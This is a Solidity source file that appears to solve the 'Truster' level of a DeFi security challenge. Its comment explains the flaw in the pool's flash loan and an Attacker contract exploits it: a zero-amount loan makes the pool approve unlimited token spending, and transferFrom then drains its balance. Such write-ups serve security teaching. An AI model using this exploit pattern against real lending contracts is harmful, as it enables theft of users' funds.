// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interfaces
interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
}

interface IDVT {
    function transferFrom(address from, address to, uint256 amount) external;
}


/*
* TrusterLenderPool Contract has a simple flash loan method.
* - It requires 4 parameters: amount, borrower address, target address and data.
* - When its executed it follows this pattern:
* - - Transfer specified ERC20 token (requested amount) to the borrower address.
* - - - Simply calls transfer method.
* - - Then instead of calling a specified contract or borrower contract, it calls another given contract.
* - - - Usually flash loan methods transmit execution flow to the calling contract to let it do its jobs and repay.
* - - After "target" contract finish its execution, checks the balance to see if it is paid back.

*****************

* Exploit:
* Since we define target contract to be called and calldata in input parameter, 
* We can do anything we can on behalf of lender contract. However, we can't directly transfer tokens,
* since it checks balance before and after.
* Instead, we can call "approve" function of ERC20 token, and give allowance to us to use lenders tokens.
* For this purpose, we prepare a calldata payload and flash loan zero tokens by specifying target address as token contract.
* Lender contract will call token contract with that data and give us allowance.
* Then we will transfer its tokens to recovery.
* All should be done in constructor.
*/

contract Attacker {

    constructor(address lender, address token, address recovery) {
        uint256 balance = 1_000_000e18;
        bytes memory approval_payload = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        ITrusterLenderPool(lender).flashLoan(0, msg.sender, token, approval_payload);
        IDVT(token).transferFrom(lender, recovery, balance);
    }

    
}